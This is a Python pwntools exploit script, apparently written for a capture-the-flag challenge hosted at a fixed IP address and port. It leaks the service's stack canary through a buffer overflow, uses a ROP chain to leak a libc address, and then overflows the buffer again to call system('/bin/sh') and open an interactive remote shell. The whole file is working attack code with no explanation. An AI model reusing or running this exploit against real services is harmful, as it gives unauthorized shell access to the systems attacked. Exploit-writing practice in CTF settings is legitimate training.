#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

host = "140.115.59.7"
port = 11005

yuan = remote(host,port)


pop_rdi = 0x0000000000400923
bin_sh_libc = 0x18c58b
puts_plt = 0x400600
printf_plt = 0x400620
read_GOT = 0x601038
read_libc = 0xf69a0
printf_GOT = 0x601028
libc_printf_offset = 0x557b0
libc_system_offset = 0x45380

main = 0x40078d


p = 'a' * 137
print "FF: " , yuan.recvuntil(':')
yuan.send(p)
yuan.recvuntil('echo')
output = yuan.recvuntil('I')
print "output !" , output
canary = output[138:-1]
print "canary: !" +  canary
print "Canary Len :" , len(canary)

p2 = 'exit' + "A"*132
p2 += '\x00'
p2 += canary
p2 += "B" * (23 - len(canary))
p2 += "EBBBBBBP"
p2 += p64(pop_rdi)
p2 += p64(read_GOT)
p2 += p64(puts_plt)
p2 += p64(main)

yuan.send(p2)

yuan.recvuntil('~\n')

puts = yuan.recvuntil('\n')
print puts
hh = ''.join(hex(ord(c)).replace('0x','') for c in puts[:-1])
print "HH :" , hh
ihh = int(hh,16)
print hex(ihh)
rhh = hh[10:] + hh[8:-2] + hh[6:-4] + hh[4:-6] + hh[2:-8] + hh[:-10]
print "RHH :" + rhh
irhh = int(rhh,16)

libc_addr = irhh - read_libc
system_addr = libc_addr + libc_system_offset
bin_sh_addr = libc_addr + bin_sh_libc


print "SYStem_addr :" , hex(system_addr)

p4 = 'exit' + "A"*132
p4 += '\x00'
p4 += canary
p4 += "B" * (23 - len(canary))
p4 += "EBBBBBBP"
p4 += p64(pop_rdi)
p4 += p64(bin_sh_addr)
p4 += p64(system_addr)

yuan.send(p4)

yuan.interactive()
